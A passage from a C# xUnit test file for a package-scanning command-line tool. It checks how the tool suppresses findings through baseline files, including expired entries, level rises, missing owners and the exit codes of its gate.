        Assert.Equal("review", (string?)kept["baseline"]!["rose"]);
        Assert.Empty(document["suppressed"]!.AsArray());
        Assert.Equal(1, (int)document["baseline"]!["rose"]!);
    }

    [Fact]
    public async Task An_expired_baseline_entry_no_longer_suppresses_its_finding()
    {
        using var dir = new TempDir();
        var package = Package(Path.Combine(dir.Path, "pkg.tgz"));
        var (_, first, _) = await Batch("--file", package);
        var key = (string)first!["findings"]!.AsArray().First(f => (string?)f!["level"] == "noteworthy")!["key"]!;
        var baseline = WriteBaseline(dir, [(key, "2000-01-01")]);
        var (code, document, _) = await Batch("--file", package, "--baseline", baseline, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        var kept = Assert.Single(document!["findings"]!.AsArray(), f => (string?)f!["key"] == key)!;
        Assert.Equal("2000-01-01", (string?)kept["baseline"]!["expired"]);
        Assert.Contains(document["gate"]!["reasons"]!.AsArray(), r => ((string)r!).EndsWith(key, StringComparison.Ordinal));
    }

    [Fact]
    public async Task A_run_baselined_against_its_own_earlier_result_passes_the_gate_and_a_level_rise_fails()
    {
        using var dir = new TempDir();
        Package(Path.Combine(dir.Path, "in", "pkg.tgz"));
        var input = Path.Combine(dir.Path, "in");
        var (_, first, output) = await Batch("--file", input, "--recurse");
        var earlier = WriteText(dir.File("earlier.json"), output);
        var (code, document, _) = await Batch("--file", input, "--recurse", "--baseline", earlier, "--fail-on", "review");
        Assert.Equal(0, code);
        var suppressed = document!["records"]!.AsArray().SelectMany(r => r!["suppressed"]!.AsArray()).ToList();
        Assert.NotEmpty(suppressed);
        Assert.All(suppressed, f => Assert.Equal("from earlier.json", (string?)f!["baseline"]!["reason"]));
        Assert.Null(suppressed[0]!["baseline"]!["owner"]);

        // The earlier result held the noteworthy finding at review level.
        var record = first!["records"]![0]!;
        var sha = (string)record["file"]!["sha256"]!;
        var finding = record["findings"]!.AsArray().First(f => (string?)f!["level"] == "noteworthy")!;
        finding["key"] = ToolCli.FindingKey(sha, (string?)finding["rule"], "review", (string?)finding["evidence"], (string?)finding["location"]);
        earlier = WriteText(dir.File("earlier.json"), first.ToJsonString());
        (code, document, _) = await Batch("--file", input, "--recurse", "--baseline", earlier, "--fail-on", "noteworthy");
        Assert.Equal(1, code);
        Assert.Contains(document!["records"]![0]!["findings"]!.AsArray(), f => (string?)f!["baseline"]?["rose"] == "review");
    }

    [Fact]
    public async Task A_baseline_entry_without_an_owner_is_a_usage_error()
    {
        using var dir = new TempDir();
        var plain = WriteText(dir.File("notes.txt"), "plain text");
        var baseline = WriteText(dir.File("baseline.json"), """{"schema":"corvus.baseline/1","entries":[{"key":"k","reason":"r","expires":"2999-12-31"}]}""");
        var (code, _, output) = await Batch("--file", plain, "--baseline", baseline);
        Assert.Equal(2, code);
        Assert.Empty(output);
    }

    [Fact]
    public void A_summary_step_without_a_result_leaves_the_level_unknown()
    {
        Assert.Equal("unknown", (string?)ToolCli.Verdict(null)["level"]);
    }
}
